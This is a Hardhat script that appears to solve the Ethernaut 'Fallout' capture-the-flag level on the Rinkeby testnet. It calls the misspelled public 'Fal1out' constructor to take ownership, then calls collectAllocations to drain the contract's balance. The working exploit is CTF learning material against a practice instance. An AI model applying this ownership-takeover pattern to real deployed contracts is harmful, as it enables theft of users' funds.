/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const INSTANCE = "0x82d6CBfDFDCC0f6ABC2f06A5967957C216610274"

async function instanceState(contract, rinkeby) {
  console.log('                          INSTANCE STATE')
  console.log("Storage '0'", await rinkeby.getStorageAt(INSTANCE, 0))
  console.log("Storage '1'", await rinkeby.getStorageAt(INSTANCE, 1))
  console.log("Storage '2'", await rinkeby.getStorageAt(INSTANCE, 2))
  console.log("Storage '3'", await rinkeby.getStorageAt(INSTANCE, 3))
  console.log("Storage '4'", await rinkeby.getStorageAt(INSTANCE, 4))
  console.log("Storage '5'", await rinkeby.getStorageAt(INSTANCE, 5))
  console.log("Storage '6'", await rinkeby.getStorageAt(INSTANCE, 6), '\n')
  const owner = await contract.owner()
  console.log(`owner of the contract: ${owner}`)
  const allocatorBalance = await contract.allocatorBalance(owner)
  console.log(`owner's contributions: ${allocatorBalance} ETH`)
  const contractBalance = await rinkeby.getBalance(INSTANCE)
  console.log(`contract's balance: ${contractBalance} ETH \n\n`)
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')

  // We get the contract to deploy
  const Fallout = await ethers.getContractFactory('Fallout');
  const contract = Fallout.attach(INSTANCE)
  console.log('Contract functions')
  console.log(contract.functions, '\n')
  
 
  await instanceState(contract, rinkeby)

  // 1st step call fallout function and claim it
  console.log("STEP 1\n")
  console.log("My balance:", await deployer.getBalance().then(result => ethers.utils.formatEther(result ), "ETH"))

  console.log("tx sent, waiting for confimation..\n")
  const tx = await contract.Fal1out({value: ethers.utils.parseEther('0.0001')})
  await tx.wait()
  console.log("Transaction confirmed !")
  console.log("My balance:", await deployer.getBalance().then(result => ethers.utils.formatEther(result) ), "ETH\n\n")

  await instanceState(contract, rinkeby)

  // We recup our ethers
  console.log("tx sent, waiting for confimation..\n")
  const tx2 = await contract.collectAllocations()
  await tx2.wait()
  console.log("Transaction confirmed !")

  const contractBalance = await rinkeby.getBalance(INSTANCE)
  console.log(`contract's balance: ${contractBalance} ETH \n\n`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
